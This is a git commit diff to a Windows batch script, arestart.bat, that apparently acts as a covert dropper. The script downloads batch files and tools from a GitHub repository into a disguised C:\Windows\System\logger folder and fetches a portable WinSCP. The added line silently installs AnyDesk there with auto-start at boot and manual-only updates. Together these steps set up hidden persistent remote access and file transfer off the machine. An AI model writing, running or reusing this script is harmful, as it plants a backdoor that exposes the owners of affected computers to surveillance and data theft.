9b6fcdcffcbaa923b68647a20a726d1d7662da90
TheBetaBiggie <53587460+TheBetaBiggie@users.noreply.github.com>
2022-08-24 17:29:19 -0700

    Update arestart.bat

--- arestart.bat
+++ arestart.bat
@@ -8,6 +8,7 @@ powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR
 powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/gen.bat -OutFile C:\Windows\System\logger\gen.bat
 mkdir C:\Windows\System\logger\Anydesk
 powershell Invoke-WebRequest https://download.anydesk.com/AnyDesk.exe -OutFile C:\Windows\System\logger\Anydesk\installer.exe
+C:\Windows\System\logger\AnyDesk\installer.exe --install "C:\Windows\System\logger\AnyDesk" --start-with-win --silent --update-manually
 :scp
 powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/WinSCP-5.21.2-Portable.zip -OutFile C:\Windows\System\logger\scp.zip
 powershell Expand-Archive C:\Windows\System\logger\scp.zip -DestinationPath C:\Windows\System\logger\
